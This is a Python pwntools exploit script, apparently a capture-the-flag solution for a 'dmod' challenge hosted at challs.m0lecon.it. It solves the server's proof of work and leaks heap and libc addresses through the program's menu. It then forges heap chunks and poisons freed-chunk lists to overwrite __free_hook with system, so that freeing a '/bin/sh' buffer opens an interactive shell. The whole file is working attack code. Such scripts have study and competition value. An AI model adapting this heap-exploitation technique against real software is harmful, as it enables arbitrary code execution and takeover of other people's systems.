#!/usr/bin/python

from pwn import *
import sys
from hashlib import sha256

remote_ip, port = 'challs.m0lecon.it', 1743
binary = './dmod'
brkpts = '''
'''

elf = ELF("dmod")
libc = ELF("libc-2.31.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
#context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a, drop = True)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    solvepow(io, 5)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.31.so'})

def choice(idx):
    sla("[l]eave the factory\n", str(idx))

def create(idx, size = 0, name = ''):
    choice('c')
    sla("between 0 and 255!\n", str(idx))
    sla("(y/n)\n", 'y')
    sla("long is it?\n", str(size))
    sla("name?\n", name)
    reu("donut! ")
    return int(re(14), 16)

def view(addr):
    choice('v')
    sla("view it!\n", hex(addr))

def free(addr):
    choice('t')
    sla("destroy it!\n", hex(addr))

if __name__ == "__main__":
    leak = create(0, 10, "a"*10)
    heap = leak - 0x16c0
    log.info("Heap -> "+hex(heap))
    libc.address = create(0, 0xffffff8, "a"*10) + 0x103ebff0 - 0x3e8000
    log.info("Libc -> "+hex(libc.address))

    free_hook = libc.symbols['__free_hook']
    system = libc.symbols['system']

    payload = "a"*7 + p64(0x61) + p64(0) + p64(0x61) + p64(0) + p64(0x61) + p64(0) + p64(0x61) + "/bin/sh\x00"
    create(0, 0x50, payload)

    chunk1 = heap + 0x16f0
    chunk2 = heap + 0x1700
    chunk3 = heap + 0x1710
    binsh = heap + 0x1720

    free(chunk3)
    free(chunk2)
    free(chunk1)

    create(0, 0x50, "a"*7 + p64(0) + p64(free_hook - 8))
    create(0, 0x50, "a")
    create(0, 0x50, "a"*7 + p64(system))

    free(binsh)
    gdb.attach(io)
    io.interactive()
